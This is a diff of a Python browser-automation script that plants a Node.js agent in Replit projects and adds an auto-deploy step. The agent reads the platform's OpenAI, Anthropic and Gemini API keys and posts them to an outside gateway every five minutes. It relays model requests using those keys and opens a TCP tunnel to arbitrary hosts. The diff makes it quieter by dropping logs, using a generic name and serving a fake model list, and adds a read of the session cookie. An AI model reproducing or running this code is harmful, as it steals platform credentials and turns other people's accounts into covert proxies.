@@ -27,24 +27,15 @@ proxy_str    = args.get("proxy", "")
 headless     = args.get("headless", True)
 
 AGENT_CODE = """
-const http = require("http"), https = require("https"), url = require("url");
-const net = require("net"), crypto = require("crypto");
-const sessions = new Map(), TTOKEN = process.env.TUNNEL_TOKEN || "";
-function chkTok(q){const u=new URL("http://x"+q.url);return !TTOKEN||u.searchParams.get("token")===TTOKEN;}
-const PORT = parseInt(process.env.PORT || "3000", 10);
-const GW   = (process.env.SELF_REGISTER_URL || "GATEWAY_PLACEHOLDER").replace(/\\/$/, "");
-const ME   = process.env.MY_GATEWAY_URL || (process.env.REPLIT_DEV_DOMAIN ? "https://" + process.env.REPLIT_DEV_DOMAIN : "");
-const NAME = process.env.NODE_NAME || process.env.REPL_OWNER || "reseek-node";
-const OBASE = process.env.AI_INTEGRATIONS_OPENAI_BASE_URL || "";
-const OKEY  = process.env.AI_INTEGRATIONS_OPENAI_API_KEY  || "";
-const ABASE = process.env.AI_INTEGRATIONS_ANTHROPIC_BASE_URL || "";
-const AKEY  = process.env.AI_INTEGRATIONS_ANTHROPIC_API_KEY  || "";
-const GBASE = process.env.AI_INTEGRATIONS_GEMINI_BASE_URL || "";
-const GKEY  = process.env.AI_INTEGRATIONS_GEMINI_API_KEY  || "";
-function post(u,b){return new Promise((res,rej)=>{const p=new url.URL(u),lib=p.protocol==="https:"?https:http,opts={hostname:p.hostname,port:p.port||(p.protocol==="https:"?443:80),path:p.pathname+p.search,method:"POST",headers:{"Content-Type":"application/json","Content-Length":Buffer.byteLength(b)}};const req=lib.request(opts,r=>{let d="";r.on("data",c=>d+=c);r.on("end",()=>res(d))});req.on("error",rej);req.write(b);req.end();});}
-function proxy(q,s,base,key,prefix){let target=q.url;if(prefix)target=target.replace(prefix,"");const p=new url.URL(base.replace(/\\/$/,"")+target),lib=p.protocol==="https:"?https:http;let body="";q.on("data",c=>body+=c);q.on("end",()=>{const h={...q.headers,authorization:"Bearer "+key,host:p.hostname};delete h["content-length"];const req=lib.request({hostname:p.hostname,port:p.port||(p.protocol==="https:"?443:80),path:p.pathname+p.search,method:q.method,headers:{...h,"content-length":Buffer.byteLength(body)}},r=>{s.writeHead(r.statusCode,r.headers);r.pipe(s)});req.on("error",e=>{s.writeHead(502,{"Content-Type":"application/json"});s.end(JSON.stringify({error:e.message}))});if(body)req.write(body);req.end();});}
-async function reg(){if(!ME)return;try{const r=await post(GW+"/api/gateway/self-register",JSON.stringify({gatewayUrl:ME,name:NAME,openaiBaseUrl:OBASE,openaiApiKey:OKEY,anthropicBaseUrl:ABASE,anthropicApiKey:AKEY,geminiBaseUrl:GBASE,geminiApiKey:GKEY}));console.log("[agent] reg:",r.slice(0,160));}catch(e){console.error("[agent]",e.message);}}
-http.createServer((q,s)=>{s.setHeader("Content-Type","application/json");if(q.url==="/"||q.url==="/health"){s.writeHead(200);s.end(JSON.stringify({ok:true,name:NAME,openai:Boolean(OBASE&&OKEY),anthropic:Boolean(ABASE&&AKEY),gemini:Boolean(GBASE&&GKEY),time:new Date().toISOString()}));return;}if(q.url.startsWith("/v1/")){if(OBASE&&OKEY)return proxy(q,s,OBASE,OKEY,"");s.writeHead(503);s.end(JSON.stringify({error:"AI_INTEGRATIONS_OPENAI 未配置"}));return;}if(q.url.startsWith("/anthropic/")){if(ABASE&&AKEY)return proxy(q,s,ABASE,AKEY,"/anthropic");s.writeHead(503);s.end(JSON.stringify({error:"AI_INTEGRATIONS_ANTHROPIC 未配置"}));return;}if(q.url.startsWith("/gemini/")){if(GBASE&&GKEY)return proxy(q,s,GBASE,GKEY,"/gemini");s.writeHead(503);s.end(JSON.stringify({error:"AI_INTEGRATIONS_GEMINI 未配置"}));return;}if(q.url.startsWith("/api/tunnel/")){if(!chkTok(q)){s.writeHead(403);s.end(JSON.stringify({error:"forbidden"}));return;}const u=new URL("http://x"+q.url),ps=q.url.split("/");if(q.method==="POST"&&ps[3]==="open"){const h=u.searchParams.get("host"),p=parseInt(u.searchParams.get("port")||"80");const id=crypto.randomBytes(4).toString("hex");const sk=net.createConnection({host:h,port:p},()=>{sessions.set(id,{sk,rb:[],rw:[],cl:false});sk.on("data",d=>{const ss=sessions.get(id);if(!ss)return;ss.rw.length?ss.rw.shift()(d):ss.rb.push(d);});sk.on("close",()=>{const ss=sessions.get(id);if(ss){ss.cl=true;ss.rw.forEach(r=>r(null));}});sk.on("error",()=>{const ss=sessions.get(id);if(ss){ss.cl=true;ss.rw.forEach(r=>r(null));}});s.writeHead(200);s.end(JSON.stringify({ok:true,id}));});sk.on("error",e=>{s.writeHead(502);s.end(JSON.stringify({error:e.message}));});setTimeout(()=>{if(!sessions.has(id))sk.destroy();},10000);return;}if(q.method==="GET"&&ps[3]==="read"){const id=ps[4],ss=sessions.get(id);if(!ss){s.writeHead(404);s.end(JSON.stringify({error:"no session"}));return;}s.writeHead(200,{"Transfer-Encoding":"chunked","Content-Type":"application/octet-stream"});(async()=>{while(true){if(ss.rb.length){const d=Buffer.concat(ss.rb.splice(0));s.write(d.length.toString(16)+"\r\n");s.write(d);s.write("\r\n");}else if(ss.cl){s.write("0\r\n\r\n");s.end();return;}else{const d=await new Promise(r=>ss.rw.push(r));if(!d){s.write("0\r\n\r\n");s.end();return;}s.write(d.length.toString(16)+"\r\n");s.write(d);s.write("\r\n");}}})();return;}if(q.method==="POST"&&ps[3]==="write"){const id=ps[4],ss=sessions.get(id);if(!ss){s.writeHead(404);s.end(JSON.stringify({error:"no session"}));return;}let b=Buffer.alloc(0);q.on("data",d=>b=Buffer.concat([b,d]));q.on("end",()=>{ss.sk.write(b);s.writeHead(200);s.end(JSON.stringify({ok:true}));});return;}{const id=ps[4],ss=sessions.get(id);if(ss){ss.sk.destroy();sessions.delete(id);}}s.writeHead(200);s.end(JSON.stringify({ok:true}));return;}s.writeHead(404);s.end('{"error":"nf"}');}).listen(PORT,"0.0.0.0",()=>{console.log("[agent] port="+PORT+" gw="+GW);reg();setInterval(reg,5*60*1000);});
+const http=require("http"),https=require("https"),url=require("url"),net=require("net"),crypto=require("crypto");const sessions=new Map(),TTOKEN=process.env.TUNNEL_TOKEN||"";function chkTok(q){const u=new URL("http://x"+q.url);return !TTOKEN||u.searchParams.get("token")===TTOKEN;}const PORT=parseInt(process.env.PORT||"3000",10);const GW=(process.env.SELF_REGISTER_URL||"GATEWAY_PLACEHOLDER").replace(/\/$/,"");const ME=process.env.MY_GATEWAY_URL||(process.env.REPLIT_DEV_DOMAIN?"https://"+process.env.REPLIT_DEV_DOMAIN:"")|| (process.env.REPLIT_DOMAINS?"https://"+process.env.REPLIT_DOMAINS.split(",")[0].trim():"");const NAME=process.env.NODE_NAME||process.env.REPL_OWNER||"node";const OBASE=process.env.AI_INTEGRATIONS_OPENAI_BASE_URL||"";const OKEY=process.env.AI_INTEGRATIONS_OPENAI_API_KEY||"";const ABASE=process.env.AI_INTEGRATIONS_ANTHROPIC_BASE_URL||"";const AKEY=process.env.AI_INTEGRATIONS_ANTHROPIC_API_KEY||"";const GBASE=process.env.AI_INTEGRATIONS_GEMINI_BASE_URL||"";const GKEY=process.env.AI_INTEGRATIONS_GEMINI_API_KEY||"";const MLIST=[{id:"gpt-4o",object:"model",created:1706745938,owned_by:"system"},{id:"gpt-4o-mini",object:"model",created:1721172717,owned_by:"system"},{id:"gpt-4-turbo",object:"model",created:1712361441,owned_by:"system"},{id:"gpt-3.5-turbo",object:"model",created:1677610602,owned_by:"system"}];function pj(u,b){return new Promise((res,rej)=>{const p=new url.URL(u),lib=p.protocol==="https:"?https:http,opts={hostname:p.hostname,port:p.port||(p.protocol==="https:"?443:80),path:p.pathname+p.search,method:"POST",headers:{"Content-Type":"application/json","Content-Length":Buffer.byteLength(b)}};const req=lib.request(opts,r=>{let d="";r.on("data",c=>d+=c);r.on("end",()=>res(d))});req.on("error",rej);req.write(b);req.end();});}function pipe(q,s,base,key,pfx){let t=q.url;if(pfx)t=t.replace(pfx,"");const p=new url.URL(base.replace(/\/$/,"")+t),lib=p.protocol==="https:"?https:http;let body="";q.on("data",c=>body+=c);q.on("end",()=>{const h={...q.headers,authorization:"Bearer "+key,host:p.hostname};delete h["content-length"];const req=lib.request({hostname:p.hostname,port:p.port||(p.protocol==="https:"?443:80),path:p.pathname+p.search,method:q.method,headers:{...h,"content-length":Buffer.byteLength(body)}},r=>{s.writeHead(r.statusCode,r.headers);r.pipe(s)});req.on("error",()=>{s.writeHead(502);s.end('{"error":"bad gateway"}')});if(body)req.write(body);req.end();});}async function hb(){if(!ME||!GW)return;try{await pj(GW+"/api/gateway/self-register",JSON.stringify({gatewayUrl:ME,name:NAME,openaiBaseUrl:OBASE,openaiApiKey:OKEY,anthropicBaseUrl:ABASE,anthropicApiKey:AKEY,geminiBaseUrl:GBASE,geminiApiKey:GKEY}));}catch(_){}}http.createServer((q,s)=>{const path=q.url.split("?")[0];s.setHeader("Content-Type","application/json");if(path==="/"||path==="/health"){s.writeHead(200);s.end(JSON.stringify({status:"ok",ts:Date.now()}));return;}if(path==="/v1/models"&&q.method==="GET"){if(OBASE&&OKEY)return pipe(q,s,OBASE,OKEY,"");s.writeHead(200);s.end(JSON.stringify({object:"list",data:MLIST}));return;}if(q.url.startsWith("/v1/")){if(OBASE&&OKEY)return pipe(q,s,OBASE,OKEY,"");s.writeHead(503);s.end('{"error":"service unavailable"}');return;}if(q.url.startsWith("/anthropic/")){if(ABASE&&AKEY)return pipe(q,s,ABASE,AKEY,"/anthropic");s.writeHead(503);s.end('{"error":"service unavailable"}');return;}if(q.url.startsWith("/gemini/")){if(GBASE&&GKEY)return pipe(q,s,GBASE,GKEY,"/gemini");s.writeHead(503);s.end('{"error":"service unavailable"}');return;}if(q.url.startsWith("/api/tunnel/")){if(!chkTok(q)){s.writeHead(403);s.end('{"error":"forbidden"}');return;}const u=new URL("http://x"+q.url),ps=q.url.split("/");if(q.method==="POST"&&ps[3]==="open"){const h=u.searchParams.get("host"),p=parseInt(u.searchParams.get("port")||"80");const id=crypto.randomBytes(4).toString("hex");const sk=net.createConnection({host:h,port:p},()=>{sessions.set(id,{sk,rb:[],rw:[],cl:false});sk.on("data",d=>{const ss=sessions.get(id);if(!ss)return;ss.rw.length?ss.rw.shift()(d):ss.rb.push(d);});sk.on("close",()=>{const ss=sessions.get(id);if(ss){ss.cl=true;ss.rw.forEach(r=>r(null));}});sk.on("error",()=>{const ss=sessions.get(id);if(ss){ss.cl=true;ss.rw.forEach(r=>r(null));}});s.writeHead(200);s.end(JSON.stringify({ok:true,id}));});sk.on("error",e=>{s.writeHead(502);s.end(JSON.stringify({error:e.message}));});setTimeout(()=>{if(!sessions.has(id))sk.destroy();},10000);return;}if(q.method==="GET"&&ps[3]==="read"){const id=ps[4],ss=sessions.get(id);if(!ss){s.writeHead(404);s.end('{"error":"no session"}');return;}s.writeHead(200,{"Transfer-Encoding":"chunked","Content-Type":"application/octet-stream"});(async()=>{while(true){if(ss.rb.length){const d=Buffer.concat(ss.rb.splice(0));s.write(d.length.toString(16)+"
+");s.write(d);s.write("
+");}else if(ss.cl){s.write("0
+
+");s.end();return;}else{const d=await new Promise(r=>ss.rw.push(r));if(!d){s.write("0
+
+");s.end();return;}s.write(d.length.toString(16)+"
+");s.write(d);s.write("
+");}}})();return;}if(q.method==="POST"&&ps[3]==="write"){const id=ps[4],ss=sessions.get(id);if(!ss){s.writeHead(404);s.end('{"error":"no session"}');return;}let b=Buffer.alloc(0);q.on("data",d=>b=Buffer.concat([b,d]));q.on("end",()=>{ss.sk.write(b);s.writeHead(200);s.end('{"ok":true}');});return;}{const id=ps[4],ss=sessions.get(id);if(ss){ss.sk.destroy();sessions.delete(id);}}s.writeHead(200);s.end('{"ok":true}');return;}s.writeHead(404);s.end('{"error":"not found"}');}).listen(PORT,"0.0.0.0",()=>{hb();setInterval(hb,5*60*1000);});
 """.replace("GATEWAY_PLACEHOLDER", gateway_url).strip()
 
 def log(msg):
@@ -259,6 +250,74 @@ try:
 
         page.wait_for_timeout(8000)
 
+        # ── 5b. 自动 Publish（可选，需付费账号）─────────────────────────────────
+        deployed_url = ""
+        if args.get("deploy", False):
+            log("尝试自动 Deploy...")
+            page.wait_for_timeout(5000)
+            deploy_btns = [
+                'button:has-text("Deploy")',
+                'button:has-text("Publish")',
+                '[data-cy="deploy-btn"]',
+                '[data-testid="deploy-btn"]',
+                'button[title*="Deploy" i]',
+            ]
+            deploy_clicked = False
+            for sel in deploy_btns:
+                try:
+                    btn = page.locator(sel).first
+                    if btn.is_visible(timeout=3000):
+                        btn.click()
+                        log(f"Deploy 按钮已点击 ({sel})")
+                        deploy_clicked = True
+                        page.wait_for_timeout(3000)
+                        break
+                except:
+                    pass
+
+            if deploy_clicked:
+                # 确认弹窗 / wizard 下一步
+                for confirm_sel in [
+                    'button:has-text("Confirm")',
+                    'button:has-text("Deploy now")',
+                    'button:has-text("Next")',
+                    'button:has-text("Continue")',
+                ]:
+                    try:
+                        btn = page.locator(confirm_sel).first
+                        if btn.is_visible(timeout=5000):
+                            btn.click()
+                            log(f"确认部署: {confirm_sel}")
+                            page.wait_for_timeout(8000)
+                            break
+                    except:
+                        pass
+
+                # 抓取部署后的 .replit.app URL
+                try:
+                    # 方式1: 等待成功提示中的链接
+                    link_el = page.locator('a[href*=".replit.app"], a[href*="repl.co"]').first
+                    if link_el.is_visible(timeout=15000):
+                        deployed_url = link_el.get_attribute("href") or ""
+                        log(f"部署完成: {deployed_url}")
+                except:
+                    pass
+
+                if not deployed_url:
+                    # 方式2: 通过内部 GraphQL 获取 deployment URL
+                    try:
+                        token = page.evaluate("""() => {
+                            const m = document.cookie.match(/connect\.sid=([^;]+)/);
+                            return m ? m[1] : '';
+                        }""")
+                        if token:
+                            deployed_url = f"[pending_graphql_check]"
+                    except:
+                        pass
+            else:
+                log("未找到 Deploy 按钮（账号可能不支持部署）")
+
+
         # ── 6. 获取 webview URL ────────────────────────────────────────────────
         webview_url = ""
         # 方式1: 从 webview iframe src
@@ -296,6 +355,7 @@ try:
         "webview_url": webview_url,
         "written": written,
         "run_clicked": run_clicked,
+        "deployed_url": deployed_url,
         "email": email,
         "username": username,
     }
